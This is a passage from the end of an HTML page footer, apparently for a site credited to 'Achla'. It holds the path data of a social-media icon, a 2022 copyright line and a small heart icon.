style="enable-background:new 0 0 438.536 438.536"><g><path d="M414.41 24.123C398.333 8.042 378.963.0 356.315.0H82.228C59.58.0 40.21 8.042 24.126 24.123 8.045 40.207.003 59.576.003 82.225v274.084c0 22.647 8.042 42.018 24.123 58.102 16.084 16.084 35.454 24.126 58.102 24.126h274.084c22.648.0 42.018-8.042 58.095-24.126 16.084-16.084 24.126-35.454 24.126-58.102V82.225C438.532 59.576 430.49 40.204 414.41 24.123zM335.471 168.735c.191 1.713.288 4.278.288 7.71.0 15.989-2.334 32.025-6.995 48.104-4.661 16.087-11.8 31.504-21.416 46.254-9.606 14.749-21.074 27.791-34.396 39.115-13.325 11.32-29.311 20.365-47.968 27.117-18.648 6.762-38.637 10.143-59.953 10.143-33.116.0-63.76-8.952-91.931-26.836 4.568.568 9.329.855 14.275.855 27.6.0 52.439-8.565 74.519-25.7-12.941-.185-24.506-4.179-34.688-11.991-10.185-7.803-17.273-17.699-21.271-29.691 4.947.76 8.658 1.137 11.132 1.137 4.187.0 9.042-.76 14.56-2.279-13.894-2.669-25.598-9.562-35.115-20.697-9.519-11.136-14.277-23.84-14.277-38.114v-.571c10.085 4.755 19.602 7.229 28.549 7.422-17.321-11.613-25.981-28.265-25.981-49.963.0-10.66 2.758-20.747 8.278-30.264 15.035 18.464 33.311 33.213 54.816 44.252 21.507 11.038 44.54 17.227 69.092 18.558-.95-3.616-1.427-8.186-1.427-13.704.0-16.562 5.853-30.692 17.56-42.399 11.703-11.706 25.837-17.561 42.394-17.561 17.515.0 32.079 6.283 43.688 18.846 13.134-2.474 25.892-7.33 38.26-14.56-4.757 14.652-13.613 25.788-26.55 33.402 12.368-1.716 23.88-4.95 34.537-9.708C357.458 149.793 347.462 160.166 335.471 168.735z"/></g></svg></a></div><div class=copyright>© Copyright
+2022
+<span class=split><svg fill="#bbb" width="15" height="15" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15" height="15" viewBox="0 0 15 15"><path d="M13.91 6.75c-1.17 2.25-4.3 5.31-6.07 6.94-.1903.1718-.4797.1718-.67.0C5.39 12.06 2.26 9 1.09 6.75-1.48 1.8 5-1.5 7.5 3.45 10-1.5 16.48 1.8 13.91 6.75z"/></svg></span>Achla</div></footer></body></html>
